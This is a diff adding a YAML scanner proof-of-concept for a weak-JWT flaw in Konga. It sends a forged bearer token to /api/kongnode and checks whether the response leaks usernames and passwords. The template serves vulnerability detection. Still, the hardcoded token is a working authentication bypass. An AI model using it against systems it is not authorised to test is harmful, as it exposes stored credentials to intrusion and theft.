@@ -1,0 +1,19 @@
+name: poc-yaml-konga-jwt-weak
+manual: true
+transport: http
+rules:
+  r1:
+    request:
+      cache: true
+      headers:
+        authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MQ.gSssTBEVe6X9aFEd0H_tt8kk2u7df90W1eOzNRnrsQ4
+      method: GET
+      path: /api/kongnode
+      follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b"username") && response.body.bcontains(b"password")
+
+expression: r1()
+detail:
+  author: Henry4E36(https://github.com/Henry4E36)
+  links:
+    - https://mp.weixin.qq.com/s/8guU2hT3wE2puEztdGqZQg
